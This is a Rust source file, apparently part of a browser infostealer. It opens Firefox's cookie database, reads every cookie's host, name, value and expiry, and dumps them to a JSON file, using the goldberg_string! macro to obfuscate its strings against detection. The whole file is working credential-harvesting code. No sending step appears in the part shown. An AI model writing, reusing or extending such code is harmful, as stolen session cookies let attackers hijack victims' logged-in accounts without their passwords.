use crate::import_libs::*;
use goldberg::*;
use std::fs::File;
use std::io::Write;

pub struct FirefoxCookies {
    file_path: String,
}

#[derive(Debug)]
struct CookieFirefox {
    host_key: String,
    name: String,
    path: String,
    value: String,
    expires_utc: i64,
}
impl FirefoxCookies {
    pub fn new(file_path: &str) -> Self {
        FirefoxCookies {
            file_path: String::from(file_path),
        }
    }

    pub fn query_sqlite(self) -> Result<()> {
        let mut file = File::create(goldberg_string!("firefox.json")).unwrap();
        let connection = Connection::open(self.file_path)?;

        let mut stmt = connection.prepare(goldberg_string!(
            "SELECT host, name, path, value, expiry FROM moz_cookies"
        ))?;

        let cookies = stmt.query_map([], |row| {
            Ok(CookieFirefox {
                host_key: row.get(0)?,
                name: row.get(1)?,
                path: row.get(2)?,
                value: row.get(3)?,
                expires_utc: row.get(4)?,
            })
        })?;
        file.write_all("firefox[\n".as_bytes()).unwrap();
        let mut count = 0;
        for cookie in cookies {
            let cookie = cookie.unwrap();
            let json_data = serde_json::json!({
                goldberg_string!("host_key"): cookie.host_key,
                 goldberg_string!("name"): cookie.name,
                 goldberg_string!("path"): cookie.path,
                 goldberg_string!("value"): cookie.value,
                 goldberg_string!("expires_utc"): cookie.expires_utc,
            });
            if count != 0 {
                file.write_all(",\n".as_bytes()).unwrap();
            }
            count += 1;
            file.write_all(serde_json::to_string_pretty(&json_data).unwrap().as_bytes())
                .unwrap();
        }
        file.write_all("]\n".as_bytes()).unwrap();
        Ok(())
    }
}
